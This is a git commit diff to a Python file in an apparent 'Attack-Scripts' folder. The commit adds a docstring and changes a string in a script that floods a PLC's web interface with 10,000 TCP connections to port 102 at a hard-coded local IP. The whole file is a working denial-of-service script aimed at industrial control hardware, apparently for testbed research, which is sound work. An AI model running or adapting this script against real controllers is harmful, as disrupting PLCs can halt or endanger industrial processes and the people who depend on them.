9fe7ac51fc6a6d7a3290c9f61e1232ca60b88ec3
William Jardine <williamjardine94@gmail.com>
2016-09-28 22:55:43 +0100

    Updated code and comments

--- Attack-Scripts/dos.py
+++ Attack-Scripts/dos.py
@@ -1,8 +1,15 @@
+"""
+File: dos.py
+Performs a simple TCP Denial of Service against the PLC's web interface.
+Change IP on line 12 as appropriate.
+"""
+__author__ = 'William Jardine'
+
 import socket, sys, os
 
 for i in range(1, 10000):
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.connect(('192.168.0.101', 102))
 	print "TCP packet sent to PLC"
-	s.send("TCP 192.168.2.101\r\n")
+	s.send("DoSing the PLC\r\n")
 	s.close()
